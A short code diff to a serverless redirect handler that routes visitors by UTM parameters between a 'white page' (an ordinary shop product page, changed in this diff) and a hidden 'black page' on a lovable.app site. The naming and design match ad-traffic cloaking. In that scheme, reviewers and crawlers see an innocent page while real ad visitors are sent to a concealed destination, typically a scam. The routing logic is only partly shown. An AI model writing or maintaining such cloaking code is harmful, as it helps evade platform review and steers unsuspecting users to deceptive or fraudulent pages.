@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.kindermaxx.de/en/toys/baby-toys/cuddly-toys-blankets/konges-sloejd-cuddle-toy-pony-fiona-40-cm?c=1223";
+    const whitePageURL = "https://hamercop.com/products/belgium-black-self-stripe-dobby-cotton-shirt?srsltid=AfmBOop58L6wMbWyjdm7tnJtzKxuvAtna62-qVUHfFmBH7FGMGRdPgBd";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
